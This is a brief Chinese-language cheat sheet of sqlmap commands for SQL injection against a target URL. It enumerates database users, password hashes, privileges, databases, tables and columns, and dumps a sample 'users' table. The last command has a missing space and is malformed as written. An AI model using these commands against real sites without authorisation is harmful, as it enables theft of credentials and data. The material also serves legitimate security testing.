#### sqlmap:url加引号，数据名，表名等不需要

1. 查看数据库的所有用户：sqlmap -u url --users
2. 查看数据库所有用户名的密码：sqlmap -u url  --passwords
3. 查看数据库当前用户：sqlmap -u url  --current-user
4. 判断当前用户是否有管理权限：sqlmap -u url  --is-dba
5. 列出数据库管理员角色：sqlmap -u url  --roles
6. 查看所有的数据库：sqlmap -u url  --dbs
7. 查看当前的数据库：sqlmap -u url  --current-db
8. 爆出指定数据库（stormgroup）中的所有的表：sqlmap -u url  -D stormgroup --tables
9. 爆出指定数据库指定表中的所有的列:sqlmap -u url  -D stormgroup -T users --columns
10. 爆出指定数据库指定表指定列下的数据：sqlmap -u url  -D stormgroup-T users -C username --dump